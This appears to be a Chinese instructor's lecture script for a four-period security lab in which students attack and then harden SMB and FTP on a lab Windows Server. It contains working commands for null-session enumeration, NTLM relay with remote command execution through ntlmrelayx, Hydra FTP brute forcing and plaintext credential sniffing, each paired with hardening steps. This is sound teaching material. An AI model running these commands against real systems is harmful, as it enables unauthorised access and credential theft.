# 实验三：SMB与FTP共享服务渗透 — 逐字稿

> 4 课时 × 40 分钟 = 160 分钟
> 对应讲义：项目三 Windows服务器共享管理（03-share-management.md）
> 实验文档：lab3-smb-ftp.md

---

## 第 1 课时：前置知识 + SMB匿名枚举（0-40 min）

### 开场导入（0-3 min）

同学们，上两次实验我们做了信息侦察和暴力破解+凭据提取，今天进入实验三——SMB与FTP共享服务渗透。

大家回想一下，Windows服务器上最常见的网络服务是什么？对，就是文件共享。你右键一个文件夹，点"共享"，这个动作背后跑的就是SMB协议。FTP大家也不陌生，上传下载文件用的。这两个服务在企业内网里到处都是，但它们也是最常被攻击的入口。

今天的实验我们分两件事：第一，站在攻击者角度，看看SMB和FTP有哪些可利用的漏洞；第二，站在防御者角度，做完攻击后立刻加固验证。攻防结合，这样才能真正理解为什么要做那些安全配置。

---

### 前置知识：SMB协议（3-15 min）

先说SMB协议。SMB，Server Message Block，服务器消息块。它跑在TCP 445端口上，是Windows文件共享的底层协议。你访问 `\\192.168.1.20\CompanyShare`，背后就是SMB在工作。

SMB通信分四步——

【板书/PPT展示】

第一步，Negotiate，协商版本。客户端说"我支持SMB 2.1和3.0"，服务器回"那就用3.0吧"。

第二步，Session Setup，认证。客户端发用户名密码（或者NTLM Hash），服务器验证身份。

第三步，Tree Connect，连接共享。客户端说"我要访问CompanyShare这个共享"。

第四步，文件操作。打开、读取、写入、创建，都通过SMB命令完成。

这四步里，每一步都可能出问题。今天我们重点关注的攻击面是：第一步——版本协商，SMBv1有致命漏洞；第二步——认证，NTLM中继攻击；以及一个更基础的——连认证都不需要，空会话枚举。

---

### 前置知识：SMB空会话（15-20 min）

什么是空会话？就是用空的用户名、空的密码去连SMB。你可能会想，空的用户名怎么可能登录？但Windows默认允许这种连接访问一个特殊的共享——IPC$。

IPC$是什么？Inter-Process Communication，进程间通信共享。它不包含文件，但通过它，你可以枚举这台机器上的用户列表、组列表、共享列表。也就是说，攻击者连密码都不用知道，只要能连上445端口，就能把你服务器上有哪些用户、有哪些共享全摸清楚。

这就是信息收集的第一步——不费一兵一卒，先把你摸透。

---

### 前置知识：FTP双通道与明文风险（20-25 min）

FTP也有安全问题，而且更直观。FTP用双通道——控制通道21端口传命令，数据通道传文件。关键是：所有内容全是明文！用户名、密码、文件内容，全是明文在网络上跑。

这意味着什么？只要攻击者和你同一网段，开一个Wireshark抓包，你的FTP密码就直接暴露了。等下我们会亲手做这个实验。

---

### 环境准备（25-35 min）

好，知识讲完了，我们开始动手。先确认环境。

大家看实验文档的网络拓扑——Kali攻击机192.168.1.10，Windows Server靶机192.168.1.20，都在NAT网络下。两台虚拟机都需要开机，网络需要互通。

【演示操作】

第一步，两台虚拟机开机。靶机用之前实验的快照恢复到干净状态，如果没有，就用当前的。

第二步，确认网络互通。在Kali上 `ping 192.168.1.20`，在靶机上 `ping 192.168.1.10`。两边都通了才可以继续。

第三步，靶机上需要准备好共享和FTP服务。大家按实验文档的1.2节，先创建用户和共享文件夹：

```powershell
# 在靶机PowerShell（管理员）中执行
net user Jerry P@ssw0rd123 /add
net user Tom P@ssw0rd123 /add
net localgroup 部门A /add
net localgroup 部门B /add
net localgroup 部门A Jerry /add
net localgroup 部门B Tom /add

# 创建共享文件夹
New-Item -ItemType Directory -Path "C:\SharedFolder\Sales" -Force
New-Item -ItemType Directory -Path "C:\SharedFolder\Finance" -Force

# 创建共享，部门A读取，部门B更改
New-SmbShare -Name "CompanyShare" -Path "C:\SharedFolder" -FullAccess "Administrators" -ReadAccess "部门A" -ChangeAccess "部门B"
```

第四步，安装IIS FTP服务：

```powershell
Install-WindowsFeature Web-Server, Web-FTP-Server, Web-FTP-Service, Web-FTP-Extensibility -IncludeManagementTools
```

安装完后，我们还需要通过IIS管理器创建FTP站点，这个步骤比较多，大家跟着我做——

1. 打开IIS管理器，右键"网站"，"添加FTP站点"
2. 站点名称 `CompanyFTP`，物理路径 `C:\FTPRoot`（先创建这个目录）
3. 绑定：IP选全部未分配，端口21，SSL选"无SSL"
4. 身份验证：启用"基本"，禁用匿名
5. 允许访问：指定用户 Jerry, Tom
6. 权限：读取和写入

【等待学生操作，逐一确认】

大家好了没？在Kali上试一下能不能连上靶机的445和21端口：

```bash
nmap -p 21,445 192.168.1.20
```

两个端口都是open就可以继续了。

---

### 步骤1-2：SMB匿名枚举（35-40 min）

现在开始攻击的第一步——信息收集。

在Kali终端执行：

```bash
smbclient -L //192.168.1.20 -N
```

`-N` 表示不需要密码，这就是空会话连接。大家看看输出——你能看到所有共享名！CompanyShare、C$、ADMIN$、IPC$，全列出来了。这就是空会话枚举的威力——不需要任何凭据。

再用enum4linux做更全面的枚举：

```bash
enum4linux -a 192.168.1.20
```

这个输出会很长，你会看到用户列表、组列表、共享信息。注意看用户名那部分——Jerry和Tom全暴露了。

这意味着什么？攻击者拿到了用户名列表，就可以直接拿去暴力破解了。这就是信息收集和暴力破解之间的衔接——上次实验学的Hydra，拿到用户名列表就可以直接上。

好，时间到了，下节课我们进入SMB版本识别和签名检测。

---

## 第 2 课时：SMB签名检测 + NTLM Relay攻击（40-80 min）

### 回顾导入（40-43 min）

上节课我们用空会话枚举拿到了靶机的用户和共享信息。今天我们先检测SMB的版本和签名状态，然后做一个更高级的攻击——NTLM中继。

---

### 步骤3：SMB版本识别（43-52 min）

先看靶机支持哪些SMB版本：

```bash
nmap -p 445 --script smb-protocols 192.168.1.20
```

大家看输出，dialects下面列出了支持的版本——2.0.2、2.1、3.0、3.0.2、3.1.1。注意，这里没有1.0，说明SMBv1默认没有启用。

如果SMBv1启用了，输出里会有 `1.0` 或者 `NT LM 0.12`。SMBv1为什么危险？因为MS17-010永恒之蓝。2017年WannaCry勒索病毒就是利用SMBv1的这个漏洞，不需要密码，一个数据包就能拿到SYSTEM权限。我们这次靶机是Windows Server 2025，SMBv1默认关闭，所以不用担心这个。

但大家记住，如果在真实环境中遇到老系统（Windows 2008 R2及更早），一定要检查SMBv1是否开启。

试试强制用SMBv1连接：

```bash
smbclient -L //192.168.1.20 -N -m NT1
```

NT1就是SMBv1的方言名称。如果SMBv1被禁用了，这个命令会被拒绝。大家看看输出——应该是连接失败。

---

### 步骤4：SMB签名检测（52-60 min）

接下来检测SMB签名状态，这是今天中继攻击的关键前提。

```bash
crackmapexec smb 192.168.1.20
```

看输出里的 `(signing:False)` 或者类似字段。如果显示签名未强制启用，那就意味着存在NTLM中继攻击的风险。

再用Nmap确认：

```bash
nmap -p 445 --script smb-security-mode 192.168.1.20
```

看 `message_signing` 那行——`disabled (dangerous, but default)`。注意这个"but default"——工作组模式下，Windows默认不强制SMB签名。这是微软的兼容性设计，但也是安全隐患。

SMB签名是什么？简单说，就是给每个SMB消息加一个数字签名，防止中间人篡改。如果签名是强制的，攻击者就无法把截获的认证消息转发到其他服务器——因为签名对不上。但如果签名不是强制的，那就可以转发。这就是NTLM中继攻击的原理。

---

### 步骤5：NTLM Relay攻击（60-75 min）

现在做今天的重头戏——NTLM中继攻击。

这个攻击需要两个终端配合，大家听我一步步说。

**终端1**：启动ntlmrelayx中继监听

首先，需要关闭Kali自己的SMB服务，释放445端口：

```bash
sudo systemctl stop smbd nmbd 2>/dev/null
sudo killall smbd nmbd 2>/dev/null
```

然后准备目标列表：

```bash
echo "192.168.1.20" > /tmp/targets.txt
```

启动ntlmrelayx：

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf /tmp/targets.txt -smb2support -exec-method smbexec
```

如果这个路径不存在，直接用 `ntlmrelayx.py` 试试。

看到 `SMB server started on 0.0.0.0:445` 就说明监听成功了。现在ntlmrelayx冒充了一个SMB服务器，在445端口等着受害者来连。

**终端2**：模拟受害者连接

实际攻击中，受害者是被诱骗访问攻击者的SMB共享的，比如邮件里一个 `\\攻击者IP\share` 的链接。我们这里简化一下，在靶机上模拟：

在靶机的CMD或PowerShell中执行：

```
net use \\192.168.1.10\share
```

这条命令会让靶机向Kali的445端口发起NTLM认证。Kali上的ntlmrelayx截获这个认证请求，然后把它转发到真正的目标——192.168.1.20。

回到终端1看输出：

```
[+] SMB session found for domain: WORKGROUP user: weakadmin
[+] SMB relay succeeded!
[+] SMB signing is NOT required! Relay attack may succeed
```

看到了吗？中继成功了！攻击者完全不需要知道密码，只是把受害者的认证请求转发了一下，就获得了目标服务器的访问权限。

这就是NTLM中继攻击——你不需要破解密码，只需要在中间转发一下认证请求。前提是目标服务器的SMB签名没有强制启用。

---

### 步骤5补充：用 -c 参数执行命令（75-80 min）

再演示一个更有冲击力的操作——通过中继直接在目标服务器上执行命令：

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf /tmp/targets.txt -smb2support -c "whoami"
```

再次触发认证后，你会看到输出 `winsrv\weakadmin`——我们在目标服务器上执行了 whoami 命令，而且用的是weakadmin的身份！

如果是 `ipconfig /all`，就能看到目标服务器的完整网络配置。攻击者不需要知道密码，不需要在目标服务器上装任何东西，就能远程执行命令。这就是NTLM中继的危害。

好，下节课我们做防御——启用SMB签名，看中继攻击怎么失败。

---

## 第 3 课时：SMB签名防御 + FTP渗透（80-120 min）

### 步骤6：启用SMB签名防御中继攻击（80-90 min）

上节课做了NTLM中继攻击，现在我们切换到防御者角色。

在靶机的PowerShell（管理员）中执行：

```powershell
# 启用SMB服务端签名
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# 启用SMB客户端签名
Set-SmbClientConfiguration -EnableSecuritySignature $true -Force
```

验证一下：

```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature
# 预期：True

Get-SmbClientConfiguration | Select EnableSecuritySignature
# 预期：True
```

现在回到Kali，重新检测签名状态：

```bash
crackmapexec smb 192.168.1.20
```

输出应该变成 `(signing:True)` 或者 `SMB signing: REQUIRED`。

再来一次中继攻击：

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf /tmp/targets.txt -smb2support -c "whoami"
```

触发认证，然后看输出——

```
[-] SMB signing is REQUIRED! Relay attack will NOT succeed
[*] Relay attempt to 192.168.1.20:445 FAILED
```

失败了！启用SMB签名后，中继攻击就不管用了。因为ntlmrelayx转发的消息没有合法的签名，目标服务器直接拒绝。

【板书/PPT展示对比表】

| 状态 | SMB签名 | 中继攻击结果 |
|------|---------|-------------|
| 加固前 | 未启用 | 中继成功 |
| 加固后 | 已启用 | 中继失败 |

一条PowerShell命令，就防住了NTLM中继攻击。这就是为什么要做安全加固。

---

### 步骤7-8：FTP匿名登录和暴力破解（90-100 min）

现在看FTP的问题。先测试匿名登录：

```bash
nmap -p 21 --script ftp-anon 192.168.1.20
```

因为我们配置FTP时禁用了匿名，所以这里应该显示匿名不可用。但如果FTP服务器允许匿名登录，这条命令会直接列出FTP目录内容。

接下来用Hydra暴力破解FTP密码：

```bash
# 先准备密码字典
echo -e "123456\npassword\nP@ssw0rd123\nadmin123\nqwerty" > /tmp/passwords.txt

hydra -l Jerry -P /tmp/passwords.txt ftp://192.168.1.20
```

看输出：

```
[21][ftp] host: 192.168.1.20   login: Jerry   password: P@ssw0rd123
```

FTP密码被暴力破解了。这和上次实验的SMB/RDP爆破是同一套方法，只是换了个协议。

---

### 步骤9：FTP明文嗅探（100-112 min）

接下来做FTP最经典的安全问题——明文传输嗅探。

在Kali上打开Wireshark：

```bash
sudo wireshark -i eth0 &
```

选择你的网卡（eth0或者和靶机同网段的那个），开始抓包。

然后在Kali终端用FTP连接靶机：

```bash
ftp 192.168.1.20
# 用户名：Jerry
# 密码：P@ssw0rd123
```

登录成功后，切到Wireshark，在过滤栏输入 `ftp` 或者 `tcp.port == 21`。

你会看到什么？每一条FTP交互都清清楚楚——USER Jerry、PASS P@ssw0rd123，密码就在那里，明文传输！

【强调】

大家注意，这不仅仅是FTP的问题。所有明文协议都有这个问题——HTTP、Telnet、SMTP，全是明文。所以现在行业里推HTTPS、SSH、SFTP，就是因为明文传输太危险了。

FTP的替代方案：
- **SFTP**：基于SSH的文件传输，端口22，全程加密
- **FTPS**：FTP over TLS，在FTP基础上加了SSL加密层
- **SCP**：基于SSH的文件复制

生产环境绝对不要用明文FTP。

---

### 步骤10：FTP目录遍历（112-115 min）

用刚才破解的FTP凭据登录，试试目录遍历：

```bash
ftp 192.168.1.20
# Jerry / P@ssw0rd123

cd ../../
cd ../../../
cd ../../Windows/System32/
pwd
```

如果FTP的权限配置不好，你可能能跳转到C盘根目录甚至系统目录。这就是FTP目录遍历攻击——用户隔离没做好，用户可以跳出自己的目录。

---

### 步骤11：共享权限越权测试（115-120 min）

最后测一下SMB共享的权限边界。

用Jerry（部门A，应该只有读取权限）连共享：

```bash
smbclient //192.168.1.20/CompanyShare -U Jerry%'P@ssw0rd123'
smb: \> cd Sales
smb: \Sales\> get secret_sales.txt /tmp/    # 读取应该成功
smb: \Sales\> put /tmp/test.txt              # 写入应该被拒绝
smb: \> cd Finance                           # 跨部门访问，看NTFS权限是否限制
```

如果Jerry能写入或者能访问Finance目录，说明权限配置有问题。共享权限和NTFS权限取交集——共享权限给了读取，NTFS给了修改，最终只有读取。

好，时间到了，下节课做加固和总结。

---

## 第 4 课时：SMB加固验证 + 实验总结（120-160 min）

### 步骤12：禁用SMBv1并关闭匿名枚举（120-130 min）

上节课我们启用了SMB签名防御了中继攻击，现在做更深层的加固。

在靶机PowerShell（管理员）中执行：

```powershell
# 禁用SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Set-SmbClientConfiguration -EnableSMB1Protocol $false -Force

# 关闭匿名枚举
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymousSAM /t REG_DWORD /d 1 /f

# 禁止存储网络凭据
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableDomainCreds /t REG_DWORD /d 1 /f

# 刷新策略
gpupdate /force
```

这里三个加固措施，我逐个解释：

1. **禁用SMBv1**：消除MS17-010等SMBv1漏洞的攻击面。即使你的系统打了补丁，禁用SMBv1仍然是最佳实践，因为旧协议的设计缺陷无法通过补丁完全修复。

2. **关闭匿名枚举**：RestrictAnonymous=2 禁止空会话枚举共享和用户，RestrictAnonymousSAM=1 禁止枚举SAM账号。两个都要开，缺一个都不完整。还记得第一课时我们做的空会话枚举吗？加了这两条注册表项之后，空会话就什么都查不到了。

3. **禁止存储网络凭据**：DisableDomainCreds=1 防止Windows凭据管理器缓存网络密码。这样即使攻击者拿到了管理员权限，也无法从本地提取到网络凭据，阻断了横向移动。

---

### 步骤13：验证加固效果（130-140 min）

现在回到Kali，逐项验证加固效果。

**验证1：SMBv1连接应失败**

```bash
smbclient -L //192.168.1.20 -N -m NT1
```

预期：连接被拒绝，因为服务器不再支持SMBv1。

**验证2：匿名枚举应失败**

```bash
smbclient -L //192.168.1.20 -N
```

预期：`NT_STATUS_ACCESS_DENIED`。之前能列出的所有共享，现在看不到了。

```bash
enum4linux -a 192.168.1.20
```

预期：大量枚举结果返回空或被拒绝。用户列表、组列表都拿不到了。

**验证3：CrackMapExec无法获取共享列表**

```bash
crackmapexec smb 192.168.1.20 --shares
```

预期：无法获取共享列表（需要认证才行）。

**验证4：SMB签名状态**

```bash
crackmapexec smb 192.168.1.20
```

预期：`SMB signing: REQUIRED`。中继攻击无法成功。

---

### 四项加固效果总结（140-148 min）

【板书/PPT展示】

| 加固措施 | 攻击手段 | 效果 |
|---------|---------|------|
| 禁用SMBv1 | MS17-010永恒之蓝 | 协议层面消除漏洞 |
| 关闭匿名枚举 | 空会话信息收集 | 无法枚举用户和共享 |
| 启用SMB签名 | NTLM中继攻击 | 中继消息被拒绝 |
| 禁止存储凭据 | Mimikatz提取凭据 | 本地无凭据可提取 |

组合防御 = 禁用SMBv1 + 关闭匿名枚举 + 启用SMB签名 + 禁止存储凭据

这四条加在一起，SMB的攻击面就被大幅缩减了。攻击者既摸不到信息，也中继不了认证，也提取不到凭据。

---

### 实验总结（148-158 min）

好，我们来回顾整个实验三的内容。

**攻击链回顾**：

第一步，信息收集。空会话枚举拿到用户名列表和共享列表——不需要任何凭据。

第二步，版本识别与签名检测。发现SMB签名未强制启用，判断存在中继风险。

第三步，NTLM中继攻击。截获NTLM认证请求，转发到目标服务器，无需密码即可获得访问权限。

第四步，FTP渗透。暴力破解FTP密码，Wireshark嗅探明文凭据，目录遍历测试权限边界。

**防御链回顾**：

- 启用SMB签名 → 防NTLM中继
- 禁用SMBv1 → 防MS17-010等旧协议漏洞
- 关闭匿名枚举 → 防空会话信息收集
- 禁止存储凭据 → 防凭据提取和横向移动
- FTP替代方案 → SFTP/FTPS替代明文FTP
- 共享权限最小化 → NTFS权限精细管控

**核心收获**：Windows默认配置是兼容性优先，不是安全优先。SMB签名默认不强制、空会话默认允许——这些都是为了"好用"，不是"安全"。做安全加固，就是要从"好用优先"切换到"安全优先"。

---

### 思考题布置（158-160 min）

最后布置思考题，大家写在实验报告里：

1. SMB中继攻击为什么能在不需要密码的情况下获取服务器访问权限？
2. 启用SMB签名后，中继攻击为什么无法成功？
3. FTP明文传输问题有哪些替代方案？
4. 如何确保共享文件夹的权限配置不会出现越权访问？
5. 为什么关闭匿名枚举（RestrictAnonymous=2）是重要的安全措施？

实验报告要求——

| 序号 | 记录项 | 说明 |
|------|--------|------|
| 1 | SMB匿名枚举结果 | 发现的共享、用户、组 |
| 2 | SMB中继攻击演示 | ntlmrelayx中继成功/失败的截图 |
| 3 | FTP嗅探结果 | Wireshark中明文密码的截图 |
| 4 | 共享权限越权测试 | 各账户的实际权限边界 |
| 5 | 加固前后对比 | 启用SMB签名和关闭匿名枚举后的效果 |

下次课见。

---

## 附录：教师注意事项

### 环境常见问题

1. **ntlmrelayx启动失败，445端口被占用**：确保已关闭Kali的smbd服务（`sudo systemctl stop smbd`），必要时 `sudo killall smbd`
2. **靶机net use连不上Kali**：检查Kali防火墙是否放行445端口（`sudo ufw allow 445`），确认ntlmrelayx正在监听
3. **Wireshark无抓包权限**：用 `sudo wireshark` 启动，或把当前用户加入wireshark组
4. **FTP站点创建后无法连接**：检查靶机防火墙是否放行21端口，IIS中FTP站点是否已启动

### 时间控制建议

- 第2课时的NTLM Relay是最容易超时的环节，如果学生进度慢，-c参数执行命令可以改为教师演示
- 第3课时的Wireshark嗅探如果学生不熟悉Wireshark操作，可以先用tcpdump替代：`sudo tcpdump -i eth0 -A port 21`
- 第4课时的加固验证可以让学生分组，每组验证一条加固措施，然后互相汇报

### 与前后实验的衔接

- **实验一/二**：空会话枚举拿到的用户名列表，可以直接喂给Hydra做暴力破解（实验二的知识）
- **实验四**：IIS Web安全——如果FTP目录和Web目录重合，上传WebShell就是下一个实验的内容
- **实验八**：域环境中的SMB中继攻击更危险，因为域控通常有更多高权限服务账户
